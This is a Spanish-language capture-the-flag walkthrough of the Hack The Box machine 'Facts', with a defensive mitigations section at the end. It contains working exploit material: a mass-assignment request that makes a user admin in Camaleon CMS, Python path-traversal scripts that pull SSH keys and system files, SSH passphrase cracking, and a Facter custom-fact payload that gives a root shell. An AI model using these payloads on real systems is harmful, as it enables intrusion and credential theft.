---
title: "HTB Walkthrough: Facts"
date: 2026-06-09
draft: false
description: "Walkthrough completo de la máquina Facts de Hack The Box. Dificultad Easy, OS Linux (Ubuntu 25.04). Mass Assignment en Camaleon CMS para escalar a admin, Path Traversal para extraer clave SSH, cracking de passphrase con John y escalada mediante Facter NOPASSWD sudo."
tags: ["HackTheBox", "Linux", "Easy", "MassAssignment", "PathTraversal", "CVE-2025-2304", "CVE-2026-1776", "CamaleonCMS", "SSH", "JohnTheRipper", "Facter", "Sudo", "PrivEsc", "facts", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Facts** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux (Ubuntu 25.04)**. Explotamos un Mass Assignment en Camaleon CMS para escalar nuestro rol a administrador sin conocer ninguna contraseña, aprovechamos un Path Traversal en el uploader de AWS para leer archivos del sistema y extraer una clave SSH cifrada, crackeamos la passphrase con John the Ripper, y escalamos a root abusando de permisos `sudo NOPASSWD` sobre `facter` con un custom fact Ruby malicioso.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                               |
|----------------|-------------------------------------------------------------------------------------------------------|
| **Nombre**     | Facts                                                                                                 |
| **OS**         | Linux (Ubuntu 25.04 — GNU/Linux 6.14.0)                                                              |
| **Dificultad** | Easy                                                                                                |
| **IP**         | 10.129.20.171                                                                                         |
| **Técnicas**   | Mass Assignment · Path Traversal · SSH Key Cracking · Facter sudo NOPASSWD RCE                       |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.20.171
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown
```

Escaneo de versiones sobre los puertos abiertos:

```bash
nmap -sC -sV -p22,80,54321 10.129.20.171
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp    open  http     nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http     Golang net/http server
|_http-server-header: MinIO
|_http-title: Did not follow redirect to http://10.129.20.171:9001
```

*Puertos abiertos:*
- `22` → OpenSSH 9.9p1 (disponible para acceso posterior)
- `80` → nginx con virtual host `facts.htb` — necesitamos añadirlo al `/etc/hosts`
- `54321` → **MinIO** (almacenamiento de objetos compatible con S3) que redirige a la consola de administración en el puerto 9001, no expuesto externamente

> **💡 Dato clave:** El puerto 54321 ejecuta MinIO, un servicio de almacenamiento de objetos. La consola admin (9001) no es accesible desde fuera, pero el hecho de que exista un servicio S3-compatible puede ser relevante para los uploaders de la aplicación web.

```bash
echo "10.129.20.171 facts.htb" >> /etc/hosts
```

### 1.2 Enumeración Web — Camaleon CMS

Fuzzing de directorios sobre `http://facts.htb/`:

```bash
ffuf -u http://facts.htb/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -ic -c
```

```
[Status: 302] admin     → redirige al login
[Status: 200] index
[Status: 200] search
[Status: 200] page
[Status: 200] post
```

Encontramos un panel de administración en `/admin`. Nos registramos una cuenta de usuario normal para explorar la aplicación e identificamos **Camaleon CMS versión 2.9**.

Con nuestra cuenta recién creada solo tenemos acceso a editar nuestro propio perfil. El panel muestra:
- **#ID:** 5
- **Login:** test
- **Role:** Client

![Perfil de usuario con Role: Client](/img/fact1.png)

> **💡 Superficie de ataque:** Tenemos una cuenta de usuario con rol `Client` y acceso al endpoint de cambio de contraseña. En Rails, los formularios de cambio de contraseña suelen pasar los datos directamente al modelo `User`. Si el backend no filtra explícitamente qué campos puede modificar el usuario, podría ser vulnerable a Mass Assignment.

---

## 2. Explotación — CVE-2025-2304 (Mass Assignment: Role Escalation)

### 2.1 Análisis de la Vulnerabilidad

Camaleon CMS 2.9 no filtra correctamente los parámetros que el usuario puede enviar al actualizar su perfil. Al enviar una petición `POST` al endpoint de cambio de contraseña, el backend acepta **cualquier campo del modelo `User`**, incluyendo `role`. Esto se conoce como **Mass Assignment** — el atacante puede modificar campos que deberían ser de solo lectura.

```
Flujo normal:    usuario envía password + password_confirmation → solo se actualiza la contraseña
Flujo malicioso: usuario añade &password[role]=admin → el backend actualiza también el campo role
```

### 2.2 Explotación Paso a Paso

**Paso 1 — Configurar Burp Suite como proxy e interceptar el cambio de contraseña:**

En Firefox: Configuración → General → Ajustes de red → Configuración manual de proxy:
- HTTP Proxy: `127.0.0.1`, Puerto `8080`

![Configuración del proxy en Firefox](/img/fact2.png)

En el perfil de usuario, hacemos clic en **"Change Password"** con Intercept activado en Burp Suite.

![Botón Change Password en el perfil](/img/fact3.png)

**Paso 2 — Modificar la petición POST interceptada:**

La petición original tiene este cuerpo:

```
authenticity_token=...&password=test1234&password_confirmation=test1234
```

Añadimos `&password[role]=admin` antes de hacer forward:

```
authenticity_token=...&password=test1234&password_confirmation=test1234&password[role]=admin
```

![Petición interceptada en Burp Suite con el parámetro role inyectado](/img/fact4.png)

**Paso 3 — Verificar la escalada:**

Tras hacer forward de la petición y recargar el perfil, el campo Role ahora muestra **"Administrator"**.

![Perfil mostrando Role: Administrator tras el Mass Assignment](/img/fact5.png)

> **🔑 Somos administradores del CMS sin conocer ninguna contraseña de administrador.**

✅ **Role escalado a Administrator mediante Mass Assignment (CVE-2025-2304).**

---

## 3. Explotación — CVE-2026-1776 (Camaleon CMS Path Traversal via AWS Uploader)

### 3.1 Análisis de la Vulnerabilidad

El endpoint `/admin/media/download_private_file` del plugin de AWS uploader de Camaleon CMS no valida la ruta del parámetro `file` con la función `valid_folder_path?`, a diferencia del uploader local que sí lo hace. Esto permite a un atacante autenticado como administrador leer **cualquier archivo del sistema** mediante path traversal (`../../`).

```
Flujo normal:    GET /admin/media/download_private_file?file=uploads/imagen.png → sirve el archivo
Flujo malicioso: GET /admin/media/download_private_file?file=../../etc/passwd  → lee el sistema de archivos
```

### 3.2 Fase 1 — Confirmación y Lectura de `/etc/passwd`

Usamos un script Python con la cookie de sesión de admin obtenida del navegador:

```python
#!/usr/bin/env python3
"""
CVE-2026-1776 - Camaleon CMS Path Traversal via AWS Uploader
Afecta: versiones 2.4.5.0 - 2.9.0 (anterior a commit f54a77e)
"""

import requests
from urllib.parse import urljoin

TARGET_URL  = "http://facts.htb/"
ENDPOINT    = "/admin/media/download_private_file"
SESSION_VAR = "_factsap_session"
SESSION_VAL = "lNF74a7lw4..."   # Cookie de sesión del admin obtenida del navegador
AUTH_TOKEN  = "1QGOA6YxgFANPE6XlGYPpg..."

HEADERS = {
    "Cookie": f"{SESSION_VAR}={SESSION_VAL}; auth_token={AUTH_TOKEN}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0)",
    "X-Requested-With": "XMLHttpRequest",
}

TARGET_FILES = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../config/database.yml",
    "../../../../../../../../../../app/.env",
]

for payload in TARGET_FILES:
    r = requests.get(
        urljoin(TARGET_URL, ENDPOINT),
        headers=HEADERS,
        params={"file": payload},
        allow_redirects=False,
        timeout=8,
    )
    if r.status_code == 200 and r.text.strip():
        filename = payload.split("/")[-1]
        print(f"\n[+] {filename} ({len(r.text)} bytes):\n{r.text[:500]}")
```

**Resultado:**

```
[+] passwd (1809 bytes):
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

> **💡 Usuarios con shell identificados:**
> - `trivia` (uid=1000) — usuario de la aplicación web
> - `william` (uid=1001) — usuario secundario

### 3.3 Fase 2 — Extracción Dirigida de Credenciales

Con los usuarios identificados, ejecutamos un segundo script enfocado en claves SSH, historial de shell y flags:

```python
#!/usr/bin/env python3
"""CVE-2026-1776 - Fase 2: Extracción dirigida de credenciales"""

import requests
from urllib.parse import urljoin

TARGET_URL = "http://facts.htb/"
ENDPOINT   = "/admin/media/download_private_file"
HEADERS    = { ... }  # Mismos headers que la Fase 1

DEPTH = "../../../../../../../../../../"

TARGETS = {
    "SSH": [
        ("trivia_id_ed25519",  f"{DEPTH}home/trivia/.ssh/id_ed25519"),
        ("trivia_authorized",  f"{DEPTH}home/trivia/.ssh/authorized_keys"),
        ("william_id_ed25519", f"{DEPTH}home/william/.ssh/id_ed25519"),
        ("root_id_rsa",        f"{DEPTH}root/.ssh/id_rsa"),
    ],
    "HISTORY": [
        ("trivia_bash_history",  f"{DEPTH}home/trivia/.bash_history"),
        ("william_bash_history", f"{DEPTH}home/william/.bash_history"),
    ],
    "FLAGS": [
        ("user_flag_william", f"{DEPTH}home/william/user.txt"),
        ("user_flag_trivia",  f"{DEPTH}home/trivia/user.txt"),
        ("root_flag",         f"{DEPTH}root/root.txt"),
    ],
}

def fetch(payload):
    r = requests.get(
        urljoin(TARGET_URL, ENDPOINT),
        headers=HEADERS,
        params={"file": payload},
        allow_redirects=False,
        timeout=8,
    )
    if r.status_code == 200 and r.text.strip():
        return True, r.text
    return False, f"HTTP {r.status_code}"

for category, items in TARGETS.items():
    print(f"\n=== {category} ===")
    for name, payload in items:
        ok, content = fetch(payload)
        if ok:
            print(f"[+] {name} ({len(content)} bytes)")
            with open(f"loot_{name}.txt", "w") as f:
                f.write(content)
        else:
            print(f"[-] {name} -> {content}")
```

**Archivos recuperados:**

```
loot_trivia_id_ed25519.txt   ← Clave privada SSH cifrada de trivia
loot_trivia_authorized.txt   ← Clave pública autorizada de trivia
loot_user_flag_william.txt   ← Flag de usuario (william)
```

---

## 4. User Flag

La flag de usuario de `william` se obtiene directamente vía el Path Traversal, sin necesidad de autenticación SSH:

```bash
cat loot_user_flag_william.txt
```

> 🔑 Flag de usuario obtenida.

---

## 5. Cracking de la Clave SSH — Acceso como `trivia`

La clave privada de `trivia` está cifrada con passphrase (algoritmo `bcrypt/AES`, 24 iteraciones). La crackeamos con John the Ripper:

```bash
# Convertimos la clave al formato hash que entiende John
ssh2john loot_trivia_id_ed25519.txt > hash.hash

# Atacamos con el diccionario rockyou
john hash.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
dragonballz      (loot_trivia_id_ed25519.txt)

1g 0:00:04:17 DONE — Session completed.
```

> **🔑 Passphrase encontrada:** `dragonballz`

```bash
chmod 600 loot_trivia_id_ed25519.txt
ssh -i loot_trivia_id_ed25519.txt trivia@10.129.20.171
# Passphrase: dragonballz
```

```
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
trivia@facts:~$
```

✅ **Shell obtenida como `trivia`.**

---

## 6. Escalada de Privilegios — Facter NOPASSWD sudo

### 6.1 Enumeración de Permisos sudo

```bash
trivia@facts:~$ sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### 6.2 Análisis del Vector de Escalada

`facter` es una herramienta del ecosistema de Puppet que recopila información del sistema ("facts") ejecutando código Ruby. Admite **custom facts** — scripts Ruby externos que el usuario puede proporcionar con la flag `--custom-dir`. Cuando `facter` se ejecuta como root vía sudo, cualquier código Ruby en esos scripts se ejecuta con privilegios de root.

```
Flujo normal:    sudo facter → recopila información del sistema y la imprime
Flujo malicioso: sudo facter --custom-dir /tmp/pwn → ejecuta nuestro Ruby malicioso como root
```

> **💡 Diferencia con SUID:** Un binario con SUID ejecuta siempre con el UID del propietario del archivo. Aquí el riesgo viene del diseño de la herramienta: `facter` está diseñado para ejecutar código Ruby arbitrario como parte de su funcionalidad de custom facts. Es una superficie de ataque legítima que se convierte en crítica cuando se combina con sudo sin restricción de argumentos.

### 6.3 Explotación

**Paso 1 — Crear el directorio y el custom fact malicioso:**

```bash
trivia@facts:/tmp$ mkdir -p /tmp/pwn

trivia@facts:/tmp$ cat > /tmp/pwn/root.rb << 'EOF'
Facter.add('rootshell') do
  setcode do
    system('/bin/bash -p')
    'done'
  end
end
EOF
```

Cuando `facter` carga el custom fact, ejecuta el bloque `setcode` como parte de la evaluación. Al correr con `sudo`, ese bloque se ejecuta con EUID=0, spawneando una shell root.

**Paso 2 — Ejecutar facter apuntando al directorio malicioso:**

```bash
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir /tmp/pwn rootshell
```

```
root@facts:/tmp#
```

✅ **Shell de root obtenida mediante custom fact Ruby en Facter con sudo NOPASSWD.**

---

## 7. Root Flag

```bash
root@facts:/tmp# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 8. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puerto 80 con Camaleon CMS 2.9 (`facts.htb`); Puerto 54321 con MinIO.
2. **Mass Assignment (CVE-2025-2304)** → Registro como usuario normal + Burp Suite → `&password[role]=admin` → rol escalado a Administrator sin contraseña.
3. **Path Traversal (CVE-2026-1776)** → AWS uploader no valida rutas → LFI en `/admin/media/download_private_file` → `/etc/passwd` (usuarios) + `id_ed25519` de trivia + flag de william → `user.txt`.
4. **SSH Key Cracking** → `ssh2john` + `john` + `rockyou.txt` → passphrase `dragonballz` → shell como `trivia`.
5. **PrivEsc** → `sudo -l` revela `facter` NOPASSWD → custom fact Ruby con `system('/bin/bash -p')` → shell como root → `root.txt`.

**Lo que aprendí con esta máquina:**

- **Mass Assignment es invisible sin una revisión activa del código fuente.** No hay ninguna señal externa de que el endpoint sea vulnerable — todo parece un formulario de cambio de contraseña normal. La defensa es usar `strong_parameters` en Rails para listar explícitamente los campos permitidos (`permit(:password, :password_confirmation)`) y nunca más. El problema es que los frameworks modernos hacen que sea muy fácil olvidarlo en un `update(params[:user])` descuidado.

- **El path traversal en un uploader es especialmente peligroso porque el endpoint tiene sentido que acceda al sistema de archivos.** La discrepancia entre el uploader local (que sí valida con `valid_folder_path?`) y el uploader de AWS (que no lo hace) muestra cómo una funcionalidad puede estar parcheada en un punto pero no en otro. Al auditar path traversal hay que verificar **todos** los endpoints que tocan el sistema de archivos, no solo los más obvios.

- **Las passphrases de claves SSH son un factor de seguridad real, pero solo si son fuertes.** `dragonballz` está en `rockyou.txt` y se crackeó en 4 minutos. La clave SSH sin passphrase es directamente reutilizable por cualquiera que la robe; con passphrase débil, el tiempo ganado es mínimo. La defensa es tratar la passphrase como una contraseña crítica: larga, aleatoria y guardada en un gestor de contraseñas.

- **`sudo NOPASSWD` sobre herramientas que ejecutan código externo es equivalente a dar root directo.** `facter --custom-dir` es un caso claro: la herramienta está diseñada para ejecutar Ruby arbitrario. Conceder sudo sin restringir los argumentos (`--no-custom-dir` no existe como flag, así que la única opción es quitar la entrada de sudoers) equivale a una shell root para cualquier usuario del grupo. El principio es: antes de añadir una entrada NOPASSWD, verificar que el binario no tenga mecanismos de ejecución de código arbitrario.

- **El encadenamiento de vulnerabilidades de distinta severidad puede resultar en compromiso total.** Ninguna de las vulnerabilidades individuales habría bastado por sí sola: Mass Assignment sin acceso admin no da foothold; el Path Traversal sin admin no es accesible; la clave SSH sin Path Traversal no se puede obtener. La cadena completa muestra por qué el scoring de vulnerabilidades aisladas puede subestimar el riesgo real en un sistema.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2025-2304 (Mass Assignment) | Usar `strong_parameters` en Rails: `permit(:password, :password_confirmation)` — nunca aceptar `role` como parámetro editable por el usuario |
| CVE-2026-1776 (Path Traversal) | Actualizar Camaleon a versión posterior al commit `f54a77e`; aplicar `valid_folder_path?` en **todos** los uploaders, no solo el local |
| Clave SSH con passphrase débil | Usar passphrases largas y aleatorias (20+ caracteres); considerar hardware tokens (YubiKey) |
| `facter` con sudo NOPASSWD | Eliminar la entrada de sudoers; si es necesario mantenerla, ejecutar `facter` en un wrapper que deshabilite custom facts (`--no-custom-dir` no existe — la única opción segura es eliminar el privilegio) |
